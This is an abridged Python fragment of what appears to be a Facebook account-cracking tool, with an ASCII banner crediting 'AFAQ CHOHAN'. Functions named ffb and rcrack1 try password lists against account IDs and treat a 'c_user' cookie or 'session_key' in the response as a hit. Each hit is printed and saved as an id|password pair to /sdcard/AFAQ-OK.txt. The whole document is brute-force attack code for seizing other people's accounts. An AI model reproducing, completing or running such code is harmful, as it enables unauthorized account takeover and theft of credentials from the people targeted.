...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [NSK] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [AFAQ-OK] %s | %s'%(ids,pas))
				open('/sdcard/AFAQ-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [AFAQ-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/AFAQ-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						...
						print(f'\r\x1b[1;32m [AFAQ-OK] '+ids+' | '+pas)
...
def menu_apikey():
  ...
  print("""\033[1;37m
    ...
    \033[1;36m    ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚══▀▀═╝ 
    \033[1;32m_______________________________________
\033[1;37m[-] AUTHOR    :\033[1;32m AFAQ CHOHAN 
